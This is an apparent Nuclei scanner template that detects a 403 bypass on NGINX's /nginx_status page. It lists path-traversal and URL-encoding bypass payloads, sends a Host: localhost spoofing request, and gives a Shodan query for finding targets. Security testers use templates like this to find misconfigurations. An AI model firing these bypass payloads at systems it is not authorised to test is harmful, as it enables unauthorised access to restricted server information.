id: nginx-status-403-bypass

info:
  name: Nginx Status Page - 403 Bypass
  author: pussycat0x
  severity: medium
  description: |
    Detected an NGINX status disclosure and a 403 bypass that allowed unauthorized access to the /nginx_status endpoint.
  reference:
    - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx
  metadata:
    verified: true
    shodan-query: "server:nginx"
  tags: nginx,status,disclosure,bypass,misconfig

flow: http(1) && (http(2) || http (3))

http:
  - method: GET
    path:
      - "{{BaseURL}}/nginx_status"

    matchers:
      - type: dsl
        dsl:
          - "status_code == 403"
        internal: true

  - method: GET
    path:
      - "{{BaseURL}}{{paths}}"

    attack: clusterbomb
    payloads:
      paths:
        - "/../nginx_status"
        - "/./nginx_status"
        - "/.//nginx_status"
        - "/./..;/nginx_status"
        - "/%2e%2e/nginx_status"
        - "/./%252e%252e/nginx_status"
        - "/./%6e%67%69%6e%78_%73%74%61%74%75%73"
        - "/;/nginx_status"
        - "/./?/nginx_status"
        - "/./nginx_status;"
        - "/./nginx_status%20"
        - "/./nginx_status/"

    stop-at-first-match: true

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "Active connections:")'
        condition: and

  - raw:
      - |
        @Host: localhost
        GET /nginx_status HTTP/1.1
        Host: localhost

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "Active connections:")'
        condition: and
